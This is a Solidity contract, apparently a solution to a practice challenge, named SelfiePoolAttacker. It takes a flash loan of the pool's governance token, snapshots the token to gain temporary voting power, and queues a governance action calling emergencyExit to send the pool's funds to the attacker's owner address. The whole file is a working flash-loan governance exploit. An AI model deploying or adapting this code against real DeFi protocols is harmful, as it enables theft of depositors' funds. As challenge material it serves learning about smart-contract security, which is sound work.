// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./ISimpleGovernance.sol";

import "forge-std/console.sol";

interface ISelfiePool {
  function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external returns (bool);

    function maxFlashLoan(address _token) external view returns (uint256);
    function emergencyExit(address receiver) external;
}

interface IERC20Snapshot is IERC20 {
  function snapshot() external;
}

contract SelfiePoolAttacker is IERC3156FlashBorrower {
  address _owner;
  ISelfiePool _pool;
  IERC20Snapshot _token;
  ISimpleGovernance _governance;
  uint256 public actionId;

  constructor(address pool, address token, address governance) {
    _owner = msg.sender;
    _pool = ISelfiePool(pool);
    _token = IERC20Snapshot(token);
    _governance = ISimpleGovernance(governance);
    actionId = 0;
  }

  function attack() external {
    require(msg.sender == _owner, "only owner");
    uint256 maxLoan = _pool.maxFlashLoan(address(_token));
    _pool.flashLoan(this, address(_token), maxLoan, "0x");
  }

  function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
      _token.snapshot();
      bytes memory callData = abi.encodeWithSignature("emergencyExit(address)", _owner);
      actionId = _governance.queueAction(address(_pool), 0, callData);      
      _token.approve(address(_pool), amount);
      return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

}